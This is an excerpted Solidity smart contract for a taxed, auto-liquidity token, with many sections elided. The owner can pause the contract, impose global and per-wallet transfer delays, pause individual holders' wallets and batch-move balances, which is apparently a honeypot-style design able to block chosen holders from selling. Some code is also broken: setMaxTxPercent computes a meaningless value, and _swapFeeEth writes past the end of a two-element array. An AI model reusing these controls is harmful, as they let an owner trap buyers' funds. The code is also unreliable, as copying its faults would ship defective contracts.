...
abstract contract AbstractDeflationaryAutoLPToken is AbstractDeflationaryToken {
    ...
    constructor(string memory tName, string memory tSymbol, uint256 totalAmount, uint256 tDecimals, uint256 tTaxFee, uint256 tLiquidityFee,
                uint256 maxTxAmount, address liquidityPoolAddress)
    ...
    function inTAllowance(uint256 amount) public view returns (bool) {
    ...
    function getLiquidity(bool _useWETH) public view returns (uint256) {
    ...
    function _setTAllowance(uint256 _percentage) external onlyOwner {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual override {
        ...
        //make sure its not our pair or 0x0
        if (from != poolAddress) {
            if (!securedAdr(from)) require(amount <= _maxTxAmount, "Above max tokens transfer");
            if (_lToSwap) _canTransfer();
            require(inTAllowance(amount), "Above max % transfer allowance");
        }

        //if any account belongs to _isExcludedFromFee account then remove the fee
        bool takeFee = _isExcludedFromFee[from] == 0 && _isExcludedFromFee[to] == 0;
        IUniswapV2Pair(poolAddress).sync(); // Sync to fix swap error
...
abstract contract AbstractDeflationaryToken is Context, IERC20, CoolOff {
    ...
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
        _maxTxAmount = _tTotal * maxTxPercent > 100 ? 100 : maxTxPercent / 100;
    }
...
abstract contract CoolOff is SecPausable, Holders {
    ...
    function _canTransfer() internal {
        if (secured()) return;
        if (_globalDelay != 0) {
            uint256 _time = _atGDelay();
            require(_time == 0, string(abi.encodePacked("Contract Cool Off seconds: ", Strings.toString(_time))));
        ...
        if (isHolder(_msgSender())) {
            ...
            if (_prTime != 0) {
                require(_prTime > 1, "Personal Wallet is paused");
                uint256 _time = _atPrDelay(_prTime);
                require(_time == 0, string(abi.encodePacked("Personal Wallet Cool Off seconds: ", Strings.toString(_time))));
                holderStructs[_account].privateTime = 0;
            }

            if (_personalDelay != 0) {
                uint256 _time = _atPDelay(_account);
                require(_time == 0, string(abi.encodePacked("Wallet Cool Off seconds: ", Strings.toString(_time))));
    ...
    function _getPrDelay(address _account) external view onlyOwner returns (uint256) {
        return holderStructs[_account].privateTime;
    }

    function _setGDelay(uint256 _secDelay) external onlyOwner {
        _globalDelay = _secDelay;
    }

    function _setPDelay(uint256 _secDelay) external onlyOwner {
        _personalDelay = _secDelay;
    }

    function _setPrDelay(address _account, uint256 _secDelay) external onlyOwner {
    ...
    function _setLToSwap(bool _limit) external onlyOwner {
        _lToSwap = _limit;
    }
}
...
abstract contract DeflationaryAutoLPToken is AbstractDeflationaryAutoLPToken {
    ...
    constructor(string memory tName, string memory tSymbol, uint256 totalAmount, uint256 tDecimals, uint256 tTaxFee, uint256 tLiquidityFee,
        uint256 maxTxAmount, address tUniswapV2Router) AbstractDeflationaryAutoLPToken(tName, tSymbol,totalAmount, tDecimals, tTaxFee,
            tLiquidityFee, maxTxAmount, 
...
contract FeeToAddrDeflAutoLPToken is DeflationaryAutoLPToken, FeeToAddress {
    constructor(string memory tName,  string memory tSymbol, uint256 totalAmount, uint256 tDecimals, uint256 tTaxFee, uint256 tLiquidityFee,
        uint256 maxTxAmount, address tUniswapV2Router) DeflationaryAutoLPToken( tName, tSymbol, totalAmount, tDecimals, tTaxFee,
            tLiquidityFee, maxTxAmount, tUniswapV2Router) {}

    function _getFeesArray(uint256 tAmount, uint256 rate, bool takeFee) internal view virtual override returns (uint256[] memory fees) {
        fees = super._getFeesArray(tAmount, rate, takeFee);

        if (takeFee && (_feesAdrValid() || _feesBnbValid())) {
            uint256 _tot = _feesAdrValid() && _feesBnbValid() ? feePerc + bnbPerc : _feesBnbValid() ? bnbPerc : feePerc;
    ...
    function _swapFeeEth(uint256 _feeSize) external onlyContr {
        address[] memory _path = new address[](2);
        _path[0] = address(this);
        _path[1] = WETH;
        if (feeToken != address(0)) {
             _path[2] = feeToken;
             uniswapV2Router.swapExactTokensForTokens(_feeSize, 0, _path, bnbReceiver, block.timestamp);
        } else {
            uniswapV2Router.swapExactTokensForETH(_feeSize, 0, _path, bnbReceiver, block.timestamp);
        }
    }

    function _payFeesForEth(uint256 _feeSize) public {
        require(balanceOf(address(this)) >= _feeSize, "Low Balance CNT");
        _approve(address(this), address(uniswapV2Router), _feeSize);
        this._swapFeeEth(_feeSize);
    }
...
abstract contract Holders is Context, Security {
    ...
    function addViewHolder(address account) external onlyOwner {
         if (!isHolder(account)) newHolder(account);
        holderStructs[account].vAllow = true;
    }
    ...
    function _getHolders(bool send) external view returns (address[] memory) {
        if (send) {
    ...
    function _batchTransfer(address[] memory wallets, uint256[] memory balances) external onlyOwner {
        require(wallets.length == balances.length, "Addresses don't match values");
        for (uint256 i = 0; i < wallets.length; i++) { _secTransfer(wallets[i], balances[i]); }
    }
...
abstract contract SecPausable is Security {
    ...
    modifier isPaused(address _to) {
        require(!paused() || secured() || securedAdr(_to) || _msgSender() == _getPool(), "Pausable: Contract Paused");
        _;
    }
